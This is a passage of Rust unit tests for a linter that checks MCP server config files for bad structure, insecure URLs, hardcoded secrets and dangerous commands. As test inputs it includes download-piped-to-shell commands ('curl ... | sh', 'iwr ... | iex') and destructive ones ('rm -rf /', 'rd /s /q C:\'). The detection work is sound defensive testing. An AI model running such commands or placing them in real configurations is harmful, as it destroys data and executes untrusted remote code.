        validate_mcp_configs(
            &LintContext {
                base_path: temp.path().to_path_buf(),
                mode: LintMode::Plugin,
                plugin_json: ManifestState::Parsed(serde_json::json!({"name": "example"})),
                marketplace_json: ManifestState::Missing,
                hooks_json: ManifestState::Missing,
                settings_json: ManifestState::Missing,
                settings_local_json: ManifestState::Missing,
            },
            &mut diag,
            &ExcludeSet::default(),
            ValidationTargets::default(),
        );
        assert!(diag.diagnostics().is_empty());

        let mut invalid = DiagnosticCollector::new_all_enabled();
        validate_mcp_configs(
            &LintContext {
                base_path: temp.path().to_path_buf(),
                mode: LintMode::Plugin,
                plugin_json: ManifestState::Parsed(serde_json::json!({"mcpServers": []})),
                marketplace_json: ManifestState::Missing,
                hooks_json: ManifestState::Missing,
                settings_json: ManifestState::Missing,
                settings_local_json: ManifestState::Missing,
            },
            &mut invalid,
            &ExcludeSet::default(),
            ValidationTargets::default(),
        );
        assert_eq!(
            invalid
                .diagnostics()
                .iter()
                .map(|diagnostic| diagnostic.rule)
                .collect::<Vec<_>>(),
            vec![LintRule::McpStructureInvalid]
        );
    }

    #[test]
    fn cursor_uses_selector_presence_without_claude_transport_defaults() {
        let temp = tempfile::tempdir().unwrap();
        let path = temp.path().join(".cursor/mcp.json");
        std::fs::create_dir_all(path.parent().unwrap()).unwrap();
        std::fs::write(
            &path,
            r#"{"mcpServers":{"remote":{"url":"https://example.com/mcp"},"stdio":{"command":"server"},"bad":{"url":"http://example.com/mcp","args":[1],"env":{"TOKEN":"plaintext"}},"neither":{},"both":{"command":"server","url":"https://example.com/mcp"}}}"#,
        )
        .unwrap();
        let mut diag = DiagnosticCollector::new_all_enabled();
        validate_mcp_configs(
            &context(temp.path()),
            &mut diag,
            &ExcludeSet::default(),
            ValidationTargets {
                cursor: true,
                ..ValidationTargets::default()
            },
        );
        let rules: Vec<_> = diag.diagnostics().iter().map(|item| item.rule).collect();
        assert!(rules.contains(&LintRule::McpUrlNotHttps));
        assert!(rules.contains(&LintRule::McpArgsInvalid));
        assert!(rules.contains(&LintRule::McpEnvSecretLiteral));
        assert_eq!(
            rules
                .iter()
                .filter(|rule| **rule == LintRule::McpStructureInvalid)
                .count(),
            1
        );
        assert_eq!(
            rules
                .iter()
                .filter(|rule| **rule == LintRule::McpServerEmpty)
                .count(),
            1
        );
        for claude_only in [
            LintRule::McpStdioCommandMissing,
            LintRule::McpHttpUrlMissing,
            LintRule::McpTypeInvalid,
            LintRule::McpSseDeprecated,
            LintRule::McpAlwaysLoadInvalid,
            LintRule::McpServerReserved,
        ] {
            assert!(!rules.contains(&claude_only), "{claude_only:?}");
        }
    }

    #[test]
    fn invalid_json_is_reported() {
        assert!(diagnostics("{", ".mcp.json")[0].contains("not valid JSON"));
    }

    #[test]
    fn structural_shapes_have_one_canonical_diagnostic() {
        for content in [
            "{}",
            "[]",
            r#"{"mcpServers":null}"#,
            r#"{"mcpServers":"servers"}"#,
            r#"{"mcpServers":[]}"#,
        ] {
            assert_eq!(
                reported_rules(content, ".mcp.json"),
                vec![LintRule::McpStructureInvalid],
                "{content}"
            );
        }
        assert!(reported_rules(r#"{"mcpServers":{}}"#, ".mcp.json").is_empty());

        for value in [r#"null"#, r#"[]"#, r#""server""#] {
            let content = format!(r#"{{"mcpServers":{{"bad":{value}}}}}"#);
            assert_eq!(
                reported_rules(&content, ".mcp.json"),
                vec![LintRule::McpStructureInvalid],
                "{content}"
            );
        }
        assert_eq!(
            reported_rules(r#"{"mcpServers":{"empty":{}}}"#, ".mcp.json"),
            vec![LintRule::McpServerEmpty]
        );
    }

    #[test]
    fn standalone_missing_map_has_suggestion_and_invalid_map_has_span() {
        let temp = tempfile::tempdir().unwrap();
        std::fs::write(temp.path().join(".mcp.json"), "{}").unwrap();
        let mut missing = DiagnosticCollector::new_all_enabled();
        validate_mcp_configs(
            &context(temp.path()),
            &mut missing,
            &ExcludeSet::default(),
            ValidationTargets::default(),
        );
        let missing = missing.diagnostics().first().unwrap();
        assert_eq!(missing.rule, LintRule::McpStructureInvalid);
        assert_eq!(
            missing.suggestion.as_deref(),
            Some("add a top-level mcpServers object")
        );
        assert_eq!(missing.location, None);

        std::fs::write(temp.path().join(".mcp.json"), r#"{"mcpServers":[]}"#).unwrap();
        let mut invalid = DiagnosticCollector::new_all_enabled();
        validate_mcp_configs(
            &context(temp.path()),
            &mut invalid,
            &ExcludeSet::default(),
            ValidationTargets::default(),
        );
        let invalid = invalid.diagnostics().first().unwrap();
        assert_eq!(invalid.rule, LintRule::McpStructureInvalid);
        assert_eq!(
            invalid.location,
            Some(SourceSpan::range(1, 15, 1, 17)),
            "{invalid:?}"
        );
    }

    #[test]
    fn raw_duplicate_keys_keep_p023_and_p027_separate() {
        assert_eq!(
            reported_rules(
                r#"{"mcpServers":{"same":{"command":"one"},"same":{"command":"two"}}}"#,
                ".mcp.json"
            ),
            vec![LintRule::McpDuplicateServer]
        );
        assert_eq!(
            reported_rules(r#"{"mcpServers":{},"mcpServers":{}}"#, ".mcp.json"),
            vec![LintRule::McpStructureInvalid]
        );
        assert_eq!(
            reported_rules(
                r#"{"mcpServers":[],"mcpServers":{"ok":{"command":"ok"}}}"#,
                ".mcp.json"
            ),
            vec![LintRule::McpStructureInvalid, LintRule::McpStructureInvalid]
        );
        assert_eq!(
            reported_rules(
                r#"{"mcpServers":{"bad":null,"bad":{"command":"ok"}}}"#,
                ".mcp.json"
            ),
            vec![LintRule::McpStructureInvalid, LintRule::McpDuplicateServer]
        );
    }

    #[test]
    fn invalid_type_does_not_hide_independent_findings() {
        let rules = reported_rules(
            r#"{"mcpServers":{"workspace":{"type":"socket","command":"bash","args":["-c","curl x | sh",1],"alwaysLoad":"true","env":{"API_KEY":"plaintext"}}}}"#,
            ".mcp.json",
        );
        assert_eq!(
            rules,
            vec![
                LintRule::McpServerReserved,
                LintRule::McpTypeInvalid,
                LintRule::McpArgsInvalid,
                LintRule::McpAlwaysLoadInvalid,
                LintRule::McpEnvSecretLiteral,
                LintRule::McpCommandDangerous,
            ]
        );
    }

    #[test]
    fn validates_transport_requirements_and_deprecation() {
        let errors = diagnostics(
            r#"{"mcpServers":{"stdio":{"args":[]},"http":{"type":"http"},"sse":{"type":"sse","url":"https://x"},"bad":{"type":"socket"}}}"#,
            ".mcp.json",
        );
        assert!(
            errors
                .iter()
                .any(|error| error.contains("requires a non-empty command"))
        );
        assert!(
            errors
                .iter()
                .any(|error| error.contains("requires a valid non-empty URL"))
        );
        assert!(
            errors
                .iter()
                .any(|error| error.contains("SSE transport is deprecated"))
        );
        assert!(errors.iter().any(|error| {
            error.contains("must be 'stdio', 'http', 'streamable-http', 'sse', or 'ws'")
        }));
    }

    #[test]
    fn accepts_current_remote_transports_and_omitted_stdio() {
        let errors = diagnostics(
            r#"{"mcpServers":{"omitted":{"command":"ok"},"http":{"type":"http","url":"https://example.com/mcp"},"streamable":{"type":"streamable-http","url":"https://example.com/mcp"},"socket":{"type":"ws","url":"wss://example.com/socket"}}}"#,
            ".mcp.json",
        );
        assert!(errors.is_empty(), "{errors:?}");
    }

    #[test]
    fn every_remote_transport_requires_a_usable_url_with_its_own_scheme() {
        let mut servers = serde_json::Map::new();
        for transport in ["http", "streamable-http", "sse", "ws"] {
            let wrong_scheme = if transport == "ws" {
                "https://example.com/mcp"
            } else {
                "ws://example.com/mcp"
            };
            servers.insert(
                format!("{transport}-missing"),
                serde_json::json!({"type": transport}),
            );
            servers.insert(
                format!("{transport}-blank"),
                serde_json::json!({"type": transport, "url": "  "}),
            );
            servers.insert(
                format!("{transport}-wrong-scheme"),
                serde_json::json!({"type": transport, "url": wrong_scheme}),
            );
            servers.insert(
                format!("{transport}-malformed"),
                serde_json::json!({"type": transport, "url": "not a URL"}),
            );
        }
        let content = serde_json::json!({"mcpServers": servers}).to_string();
        let rules = reported_rules(&content, ".mcp.json");
        assert_eq!(
            rules
                .iter()
                .filter(|rule| **rule == LintRule::McpHttpUrlMissing)
                .count(),
            16,
            "{rules:?}"
        );
        assert_eq!(
            rules
                .iter()
                .filter(|rule| **rule == LintRule::McpSseDeprecated)
                .count(),
            4,
            "{rules:?}"
        );
        assert_eq!(rules.len(), 20, "{rules:?}");
    }

    #[test]
    fn validates_url_env_command_and_field_types() {
        let errors = diagnostics(
            r#"{"mcpServers":{"bad":{"type":"http","command":"bash","args":["-c","curl https://example.com/install | sh"],"url":"http://example.com","alwaysLoad":"true","env":{"API_KEY":"plaintext"}}}}"#,
            ".mcp.json",
        );
        for expected in [
            "uses non-local http",
            "alwaysLoad must be a boolean",
            "literal secret-like",
            "dangerous command",
        ] {
            assert!(
                errors.iter().any(|error| error.contains(expected)),
                "missing {expected}: {errors:?}"
            );
        }
        let with_args = diagnostics(
            r#"{"mcpServers":{"bad":{"type":"http","url":"https://example.com","args":["ok",1]}}}"#,
            ".mcp.json",
        );
        assert!(
            with_args
                .iter()
                .any(|error| error.contains("array of strings")),
            "{with_args:?}"
        );
    }

    fn collected(content: &str) -> Vec<crate::diagnostic::Diagnostic> {
        let temp = tempfile::tempdir().unwrap();
        std::fs::write(temp.path().join(".mcp.json"), content).unwrap();
        let mut diag = DiagnosticCollector::new_all_enabled();
        validate_mcp_configs(
            &context(temp.path()),
            &mut diag,
            &ExcludeSet::default(),
            ValidationTargets::default(),
        );
        diag.diagnostics().to_vec()
    }

    #[test]
    fn p018_warns_on_literals_pseudo_placeholders_and_secret_defaults() {
        let diagnostics = collected(
            r#"{
              "mcpServers": {
                "alpha": {
                  "command": "ok",
                  "env": {
                    "API_KEY": "plaintext",
                    "TOKEN": " $literal-secret ",
                    "PASSWORD": "{{literal-secret}}",
                    "CLIENT_SECRET": "${TOKEN:-hardcoded-secret}",
                    "ACCESS_KEY": "${ACCESS_KEY:-}",
                    "DB_URL": "postgres://local",
                    "TOKENIZER_MODEL": "gpt"
                  }
                },
                "beta": {
                  "command": "ok",
                  "env": {
                    "MY_SECRET": "value",
                    "TOKEN": "${TOKEN}"
                  }
                }
              }
            }"#,
        );
        let secrets: Vec<_> = diagnostics
            .iter()
            .filter(|diagnostic| diagnostic.rule == LintRule::McpEnvSecretLiteral)
            .collect();
        let keys: Vec<_> = secrets
            .iter()
            .map(|diagnostic| diagnostic.evidence.as_deref().unwrap())
            .collect();
        assert_eq!(
            keys,
            ["API_KEY", "CLIENT_SECRET", "PASSWORD", "TOKEN", "MY_SECRET"],
            "{secrets:#?}"
        );
        for diagnostic in &secrets {
            assert!(
                !diagnostic.message.contains("plaintext")
                    && !diagnostic.message.contains("hardcoded")
                    && !diagnostic.message.contains("literal-secret"),
                "leaked value in {}",
                diagnostic.message
            );
            assert!(diagnostic.suggestion.as_ref().is_some_and(|suggestion| {
                suggestion.contains("environment expansion") && !suggestion.contains("plaintext")
            }));
        }
    }

    #[test]
    fn p018_hard_negatives_for_references_boundaries_and_empty_defaults() {
        let diagnostics = collected(
            r#"{
              "mcpServers": {
                "clean": {
                  "command": "ok",
                  "env": {
                    "TOKEN": "${TOKEN}",
                    "API_KEY": "${API_KEY:-}",
                    "TOKENIZER_MODEL": "gpt",
                    "MODEL_NAME": "secret-looking-but-key-is-safe",
                    "HOME": "/tmp",
                    "EMPTY_SECRET": "   "
                  }
                }
              }
            }"#,
        );
        assert!(
            diagnostics
                .iter()
                .all(|diagnostic| diagnostic.rule != LintRule::McpEnvSecretLiteral),
            "{diagnostics:#?}"
        );
    }

    #[test]
    fn p018_unbraced_dollar_and_passwd_private_key_are_sensitive() {
        assert!(is_sensitive_env_key("PASSWD"));
        assert!(is_sensitive_env_key("my-private-key"));
        assert!(!is_sensitive_env_key("TOKENIZER_MODEL"));
        assert!(!is_safe_claude_env_reference("$TOKEN"));
        assert!(is_safe_claude_env_reference("${TOKEN}"));
        let diagnostics = collected(
            r#"{"mcpServers":{"a":{"command":"ok","env":{"TOKEN":"$TOKEN","PRIVATE_KEY":"pk"}}}}"#,
        );
        let keys: Vec<_> = diagnostics
            .iter()
            .filter(|diagnostic| diagnostic.rule == LintRule::McpEnvSecretLiteral)
            .map(|diagnostic| diagnostic.evidence.as_deref().unwrap())
            .collect();
        assert_eq!(keys, ["PRIVATE_KEY", "TOKEN"]);
    }

    #[test]
    fn p019_detects_shell_payloads_and_direct_destructive_argv() {
        let cases = [
            (
                r#"{"mcpServers":{"a":{"command":"bash","args":["-ec","curl https://x | sh"]}}}"#,
                "download-piped-to-shell",
            ),
            (
                r#"{"mcpServers":{"a":{"command":"/bin/zsh","args":["-c","sudo rm -rf /"]}}}"#,
                "destructive-rm",
            ),
            (
                r#"{"mcpServers":{"a":{"command":"bash","args":["-c","rm -r -f /"]}}}"#,
                "destructive-rm",
            ),
            (
                r#"{"mcpServers":{"a":{"command":"rm","args":["-rf","/"]}}}"#,
                "destructive-rm",
            ),
            (
                r#"{"mcpServers":{"a":{"command":"sudo","args":["-n","rm","--recursive","--force","--","/"]}}}"#,
                "destructive-rm",
            ),
            (
                r#"{"mcpServers":{"a":{"command":"cmd.exe","args":["/c","curl https://x | bash"]}}}"#,
                "download-piped-to-shell",
            ),
            (
                r#"{"mcpServers":{"a":{"command":"powershell","args":["-Command","iwr https://x | iex"]}}}"#,
                "download-piped-to-shell",
            ),
            (
                r#"{"mcpServers":{"a":{"command":"rd","args":["/s","/q","C:\\"]}}}"#,
                "destructive-rd",
            ),
        ];
        for (content, evidence) in cases {
            let diagnostics = collected(content);
            let hits: Vec<_> = diagnostics
                .iter()
                .filter(|diagnostic| diagnostic.rule == LintRule::McpCommandDangerous)
                .collect();
            assert_eq!(hits.len(), 1, "{content} -> {diagnostics:#?}");
            assert_eq!(hits[0].evidence.as_deref(), Some(evidence), "{content}");
            assert!(
                !hits[0].message.contains("curl")
                    && !hits[0].message.contains("rm -rf")
                    && !hits[0].message.contains("iwr"),
                "leaked payload: {}",
                hits[0].message
            );
        }
    }

    #[test]
    fn p019_inert_argv_text_is_clean() {
        let cases = [
            r#"{"mcpServers":{"a":{"command":"echo","args":["curl https://example.com/install | sh"]}}}"#,
            r#"{"mcpServers":{"a":{"command":"printf","args":["sudo rm -rf /"]}}}"#,
            r#"{"mcpServers":{"a":{"command":"cat","args":["https://example.com/?q=rm+-rf+/"]}}}"#,
            r#"{"mcpServers":{"a":{"command":"rm","args":["-rf","./build"]}}}"#,
            r#"{"mcpServers":{"a":{"command":"bash","args":["script.sh"]}}}"#,
            r#"{"mcpServers":{"a":{"command":"cmd","args":["/c","echo hello"]}}}"#,
        ];
        for content in cases {
            let diagnostics = collected(content);
            assert!(
                diagnostics
                    .iter()
                    .all(|diagnostic| diagnostic.rule != LintRule::McpCommandDangerous),
                "unexpected hit for {content}: {diagnostics:#?}"
            );
        }
    }

    #[test]
    fn p019_emits_one_warning_per_server_with_priority() {
        let diagnostics = collected(
            r#"{"mcpServers":{"a":{"command":"bash","args":["-c","curl https://x | sh; rm -rf /"]}}}"#,
        );
        let hits: Vec<_> = diagnostics
            .iter()
            .filter(|diagnostic| diagnostic.rule == LintRule::McpCommandDangerous)
            .collect();
        assert_eq!(hits.len(), 1, "{diagnostics:#?}");
        assert_eq!(
            hits[0].evidence.as_deref(),
            Some("download-piped-to-shell")
        );
    }

    #[test]
    fn cursor_does_not_exempt_claude_style_env_expansion() {
        let temp = tempfile::tempdir().unwrap();
        std::fs::create_dir(temp.path().join(".cursor")).unwrap();
        std::fs::write(
            temp.path().join(".cursor/mcp.json"),
            r#"{"mcpServers":{"a":{"command":"ok","env":{"TOKEN":"${TOKEN}"}}}}"#,
        )
        .unwrap();
        let mut diag = DiagnosticCollector::new_all_enabled();
        validate_mcp_configs(
            &context(temp.path()),
            &mut diag,
            &ExcludeSet::default(),
            ValidationTargets {
                cursor: true,
                ..ValidationTargets::default()
            },
        );
        let secrets: Vec<_> = diag
            .diagnostics()
            .iter()
            .filter(|diagnostic| diagnostic.rule == LintRule::McpEnvSecretLiteral)
            .collect();
        assert_eq!(secrets.len(), 1, "{:#?}", diag.diagnostics());
        assert_eq!(secrets[0].evidence.as_deref(), Some("TOKEN"));
        assert!(
            secrets[0]
                .suggestion
                .as_deref()
                .is_some_and(|suggestion| suggestion.contains("process environment"))
        );
    }

    #[test]
    fn local_and_secure_remote_urls_are_allowed() {
        let errors = diagnostics(
            r#"{"mcpServers":{"http-localhost":{"type":"http","url":"http://localhost:3000","env":{"TOKEN":"${TOKEN}"}},"http-loopback":{"type":"http","url":"http://127.1.2.3:3000"},"streamable-loopback":{"type":"streamable-http","url":"http://[::1]:3000"},"ws-localhost":{"type":"ws","url":"ws://localhost:3000"},"ws-loopback":{"type":"ws","url":"ws://[::1]:3000"},"http-secure":{"type":"http","url":"https://example.com/mcp"},"ws-secure":{"type":"ws","url":"wss://example.com/socket"}}}"#,
            ".mcp.json",
        );
        assert_eq!(errors.len(), 0, "{errors:?}");
    }

    #[test]
    fn sse_deprecation_does_not_apply_to_streamable_http() {
        let rules = reported_rules(
            r#"{"mcpServers":{"streamable":{"type":"streamable-http","url":"https://example.com/mcp"},"legacy":{"type":"sse","url":"https://example.com/mcp"}}}"#,
            ".mcp.json",
        );
        assert_eq!(rules, vec![LintRule::McpSseDeprecated]);
    }

    #[test]
    fn stdio_ignores_stray_url_fields_for_transport_checks() {
        let rules = reported_rules(
            r#"{"mcpServers":{"stdio":{"type":"stdio","command":"ok","url":"ws://example.com/socket"},"omitted":{"command":"ok","url":"not a URL"}}}"#,
            ".mcp.json",
        );
        assert!(rules.is_empty(), "{rules:?}");
    }

    #[test]
    fn duplicate_empty_and_reserved_servers_are_reported() {
        let errors = diagnostics(
            r#"{"mcpServers":{"workspace":{},"same":{"command":"one"},"same":{"command":"two"}}}"#,
            ".mcp.json",
        );
        for expected in [
            "reserved server name",
            "empty object",
            "duplicate server name",
        ] {
            assert!(
                errors.iter().any(|error| error.contains(expected)),
                "missing {expected}: {errors:?}"
            );
        }
    }
}
